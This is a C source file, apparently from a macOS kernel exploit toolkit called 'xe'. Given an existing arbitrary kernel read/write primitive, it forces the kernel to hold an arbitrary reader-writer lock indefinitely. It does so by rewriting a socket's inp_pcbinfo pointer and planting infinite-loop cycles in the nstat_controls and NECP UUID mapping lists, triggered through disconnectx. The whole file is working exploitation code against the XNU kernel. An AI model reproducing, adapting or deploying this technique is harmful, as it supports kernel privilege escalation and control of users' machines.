//
//  util_lck_rw.c
//  xe
//
//  Created by admin on 12/2/21.
//

#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include "util/lck_rw.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"
#include "util/dispatch.h"
#include "util/assert.h"

#include "macos_params.h"


#define MAX_NECP_UUID_MAPPING_ID 128


struct xe_util_lck_rw {
    int sock_fd;
    uintptr_t target_lck_rw;
    uintptr_t socket;
    uintptr_t so_pcb;
    uintptr_t inp_pcbinfo;
    uintptr_t nstat_controls_head;
    uintptr_t nstat_controls_tail;
    uintptr_t necp_uuid_id_mapping_head;
    uintptr_t necp_uuid_id_mapping_tail;
    
    dispatch_semaphore_t sem_disconnect_done;
};

// sets value of `socket->so_pcb->inp_pcbinfo` such that address of
// `socket->so_pcb->inp_pcbinfo.ipi_lock = target_lck_rw`
void xe_util_lck_rw_set_lock(xe_util_lck_rw_t util) {
    xe_assert(util->inp_pcbinfo != 0);
    xe_assert(util->so_pcb != 0);
    uintptr_t new_inp_pcbinfo = util->target_lck_rw - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
    xe_assert(xe_kmem_read_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET) == util->inp_pcbinfo);
    xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, new_inp_pcbinfo);
}

// restores socket->so_pcb->inp_pcbinfo
void xe_util_lck_rw_restore_lock(xe_util_lck_rw_t util) {
    xe_assert(util->inp_pcbinfo != 0);
    xe_assert(util->so_pcb != 0);
    xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, util->inp_pcbinfo);
}

// make the loop `for (state = nstat_controls; state; state = state->ncs_next) { ... }`
// in `nstat_pcb_cache` method infinite
void xe_util_lck_create_nstat_controls_cycle(xe_util_lck_rw_t util) {
    xe_assert(util->nstat_controls_head != 0);
    xe_assert(util->nstat_controls_tail != 0);
    xe_assert(xe_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == 0);
    xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, util->nstat_controls_head);
}

// break infinite loop in nstat_pcb_cache
void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
    xe_assert(util->nstat_controls_head != 0);
    xe_assert(util->nstat_controls_tail != 0);
    xe_assert(xe_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == util->nstat_controls_head);
    xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, 0);
}

// save head and tail of nstat_controls tailq
void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
    xe_assert(util->nstat_controls_head == 0);
    xe_assert(util->nstat_controls_tail == 0);
    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR), 0);
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xe_kmem_read_uint64(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET);
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    xe_assert(head != tail);
    util->nstat_controls_head = head;
    util->nstat_controls_tail = tail;
}

// make the `LIST_FOREACH()...` loop in `necp_uuid_lookup_uuid_with_service_id_locked`
// method infinite
void xe_util_lck_create_necp_mapping_cycle(xe_util_lck_rw_t util) {
    xe_assert(util->necp_uuid_id_mapping_head != 0);
    xe_assert(util->necp_uuid_id_mapping_tail != 0);
    xe_assert(xe_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == 0);
    xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, util->necp_uuid_id_mapping_head);
}

// break infinite loop in necp_uuid_lookup_uuid_with_service_id_locked
void xe_util_lck_break_necp_mapping_cycle(xe_util_lck_rw_t util) {
    xe_assert(util->necp_uuid_id_mapping_head != 0);
    xe_assert(util->necp_uuid_id_mapping_tail != 0);
    xe_assert(xe_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == util->necp_uuid_id_mapping_head);
    xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, 0);
}

// ensures LIST_FOREACH in necp_uuid_lookup_uuid_with_service_id_locked never breaks
void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
    xe_assert(util->necp_uuid_id_mapping_head != 0);
    xe_assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xe_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
        xe_assert_cond(id, <=, MAX_NECP_UUID_MAPPING_ID);
        xe_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
        cursor = xe_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        xe_assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

// restores id of necp_uuid_id_mapping
void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
    xe_assert(util->necp_uuid_id_mapping_head != 0);
    xe_assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xe_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
        xe_assert_cond(id, >=, UINT16_MAX - MAX_NECP_UUID_MAPPING_ID);
        xe_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
        cursor = xe_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        xe_assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

// save head and tail of necp_uuid_id_mapping list
void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
    xe_assert(util->necp_uuid_id_mapping_head == 0);
    xe_assert(util->necp_uuid_id_mapping_tail == 0);
    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR), 0);
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xe_kmem_read_uint64(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    xe_assert(tail != head);
    util->necp_uuid_id_mapping_head = head;
    util->necp_uuid_id_mapping_tail = tail;
}

xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
    struct sockaddr_in6 src_addr;
    bzero(&src_addr, sizeof(src_addr));
    src_addr.sin6_addr = in6addr_loopback;
    src_addr.sin6_port = 18231;
    src_addr.sin6_family = AF_INET6;
    src_addr.sin6_len = sizeof(src_addr);
    
    int sock_fd = socket(PF_INET6, SOCK_DGRAM, 0);
    xe_assert(sock_fd >= 0);
    
    sa_endpoints_t epts;
    bzero(&epts, sizeof(epts));
    epts.sae_dstaddr = (struct sockaddr*)&src_addr;
    epts.sae_dstaddrlen = sizeof(src_addr);

    int res = connectx(sock_fd, &epts, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
    xe_assert(res == 0);
    
    uintptr_t socket;
    int error = xe_xnu_proc_find_fd_data(proc, sock_fd, &socket);
    xe_assert_err(error);
    
    uintptr_t inpcb = xe_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET);
    uintptr_t inp_pcbinfo = xe_kmem_read_uint64(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET);
    
    xe_util_lck_rw_t util = (xe_util_lck_rw_t)malloc(sizeof(struct xe_util_lck_rw));
    bzero(util, sizeof(*util));
    util->sock_fd = sock_fd;
    util->socket = socket;
    util->so_pcb = inpcb;
    util->inp_pcbinfo = inp_pcbinfo;
    util->target_lck_rw = lock;
    util->sem_disconnect_done = dispatch_semaphore_create(0);
    
    xe_util_lck_read_nstat_controls_state(util);
    xe_util_lck_read_necp_uuid_id_mapping_state(util);
    
    /// Sets value of `socket->so_pcb->inp_pcbinfo` such that `socket->so_pcb->inp_pcbinfo.ipi_lock = util->target_lck_rw`
    /// This lock is acquired by method `in6_pcbdisconnect` defined in in6_pcb.c when `util->socket` is disconnected
    xe_util_lck_rw_set_lock(util);
    /// Creates a infinite loop in nstat_pcb_cache function. This method is triggered by method `in6_pcbdisconnect`
    /// defined in in6_pcb.c when `util->socket` is disconnected
    xe_util_lck_create_nstat_controls_cycle(util);
    
    dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
    /// Asynchronously disconnect `util->socket`
    dispatch_async(xe_dispatch_queue(), ^() {
        dispatch_semaphore_signal(sem_disconnect_start);
        /// Triggers `in6_pcbdisconnect` method which acquires `util->target_lck_rw`. Since the method
        /// `xe_util_lck_create_nstat_controls_cycle` has created a cycle in `nstat_pcb_cache`, the lock is kept held
        /// until the cycle is broken.
        int error = disconnectx(util->sock_fd, SAE_ASSOCID_ANY, SAE_CONNID_ANY);
        xe_assert_err(error);
        dispatch_semaphore_signal(util->sem_disconnect_done);
    });
    
    dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_disconnect_start);
    /// Wait for some time so that the lock will be acquired
    sleep(1);
    
    return util;
}


void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
    /// Restores the value of `socket->so_pcb->inp_pcbinfo` so that operations in `in_pcbrehash` requiring
    /// `inp_pcbinfo` will not cause panic
    /// void
    /// in_pcbrehash(struct inpcb *inp)
    /// {
    ///     ...
    ///     inp->inp_hash_element = INP_PCBHASH(hashkey_faddr, inp->inp_lport,
    ///         inp->inp_fport, inp->inp_pcbinfo->ipi_hashmask);
    ///     head = &inp->inp_pcbinfo->ipi_hashbase[inp->inp_hash_element];
    ///     ...
    /// }
    xe_util_lck_rw_restore_lock(*util);
    
    /// Assigns different laddr (other than loopback) to `socket->so_pcb->inp_dependladdr`. This prevents
    /// `necp_socket_bypass` method from returning `NECP_BYPASS_TYPE_LOOPBACK` allowing
    /// `necp_socket_find_policy_match` to reach the below for loop
    /// `for (netagent_cursor = 0; netagent_cursor < NECP_MAX_NETAGENTS; netagent_cursor++) {
    ///     ...
    ///     mapping = necp_uuid_lookup_uuid_with_service_id_locked(netagent_id)
    ///     ...
    ///  }
    struct in6_addr new_laddr;
    memset(&new_laddr, 0xab, sizeof(new_laddr));
    xe_kmem_write((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
    
    /// Prevent the `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked` method from breaking
    /// static struct necp_uuid_id_mapping *
    /// necp_uuid_lookup_uuid_with_service_id_locked(u_int32_t local_id)
    /// {
    ///     ...
    ///     LIST_FOREACH(searchentry, &necp_uuid_service_id_list, chain) {
    ///         if (searchentry->id == local_id) {      <<<--- Prevents this if condition to become TRUE --->>>
    ///             foundentry = searchentry;
    ///             break;
    ///         }
    ///     }
    ///     ...
    /// }
    xe_util_lck_invalidate_necp_ids(*util);
    
    /// Create a infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked` method. This method is
    /// indirectly triggered during socket disconnect by method `in6_pcbdisconnect`. The call stack is
    ///     necp_uuid_lookup_uuid_with_service_id_locked
    ///     necp_socket_find_policy_match
    ///     inp_update_necp_policy
    ///     in_pcbrehash
    ///     in6_pcbdisconnect
    xe_util_lck_create_necp_mapping_cycle(*util);
    
    /// Breaks the infinite loop in `nstat_pcb_cache`
    xe_util_lck_break_nstat_controls_cycle(*util);
    
    /// Wait so that program reaches and stays at infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
    sleep(1);
    
    /// Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to util->target_lck_rw so that correct lock
    /// will be unlocked when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
    xe_util_lck_rw_set_lock(*util);
    
    /// Restore id and break the loop in infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
    xe_util_lck_restore_necp_ids(*util);
    xe_util_lck_break_necp_mapping_cycle(*util);
    
    /// Wait until socket `disconnectx` returns success
    dispatch_semaphore_wait((*util)->sem_disconnect_done, DISPATCH_TIME_FOREVER);
    
    /// Restores value of `socket->so_pcb->inp_pcbinfo`
    xe_util_lck_rw_restore_lock(*util);
    
    dispatch_release((*util)->sem_disconnect_done);
    free(*util);
    *util = NULL;
}
